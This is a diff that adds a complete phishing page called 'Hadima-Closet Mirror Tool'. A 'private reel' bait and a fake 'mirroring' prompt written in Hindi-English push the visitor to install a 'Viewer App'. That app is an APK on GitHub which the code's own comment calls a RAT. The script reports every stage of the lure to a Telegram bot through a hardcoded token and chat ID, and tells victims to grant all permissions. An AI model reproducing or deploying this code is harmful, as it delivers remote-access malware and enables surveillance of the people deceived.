@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hadima-Closet Mirror Tool</title>
+    <style>
+        body { margin: 0; background: #000; color: #fff; font-family: sans-serif; overflow: hidden; }
+        #gate { position: fixed; inset: 0; background: #000; display: flex; align-items: center; justify-content: center; z-index: 1000; }
+        .btn { padding: 15px 35px; background: #8e44ad; border: none; color: #fff; font-size: 18px; border-radius: 30px; cursor: pointer; font-weight: bold; box-shadow: 0 0 20px #8e44ad; }
+        #inbox-view { display: none; position: fixed; inset: 0; background: url('https://i.ibb.co/6R0D99T/1000010748.png') center/cover; filter: blur(4px); opacity: 0.8; z-index: 10; }
+        #trap { position: fixed; inset: 0; display: none; align-items: center; justify-content: center; z-index: 2000; background: rgba(0,0,0,0.7); }
+        .card { background: #1a1a1a; border: 1px solid #8e44ad; padding: 25px; border-radius: 20px; text-align: center; width: 85%; max-width: 320px; }
+    </style>
+</head>
+<body>
+
+<div id="gate"><button class="btn" onclick="start()">Watch Private Reel</button></div>
+<div id="inbox-view"></div>
+<div id="trap">
+    <div class="card" id="box">
+        <h3 style="color:#8e44ad; margin:0;">🔓 Mirroring Required!</h3>
+        <p style="font-size:14px; margin-top:15px;">Target device logs detect ho chuke hain. Bypass encryption ke liye <b>Viewer App</b> install karein aur mirroring allow karein.</p>
+        <button class="btn" style="width:100%;" onclick="pld()">INSTALL & MIRROR</button>
+    </div>
+</div>
+
+<script>
+    const T = "8662750137:AAGEIPealqUPso3hFzdCJrUZln684PaVX3k"; 
+    const C = "8639892987";
+    // Nayi Repo ka direct RAT link
+    const RAT_URL = "https://github.com/applesecurityalert6-prog/hadima-viewer-tool/raw/main/viewer.apk"; 
+
+    function report(m) {
+        fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent(m)}`);
+    }
+
+    function start() {
+        document.getElementById('gate').style.display = 'none';
+        report("🚀 MISSION_START: Target hooked on bait.");
+        setTimeout(() => {
+            document.getElementById('inbox-view').style.display = 'block';
+            document.getElementById('trap').style.display = 'flex';
+            report("👀 BAIT_ACTIVE: Prompting for RAT installation.");
+        }, 6000); 
+    }
+
+    function pld() {
+        report("🔥 ATTACK_SUCCESS: RAT download started!");
+        window.location.href = RAT_URL;
+        document.getElementById('box').innerHTML = "<h3>⚙️ Connecting to Mirror...</h3><p>Grant all permissions in <b>Settings</b> to link device.</p>";
+    }
+</script>
+</body>
+</html>
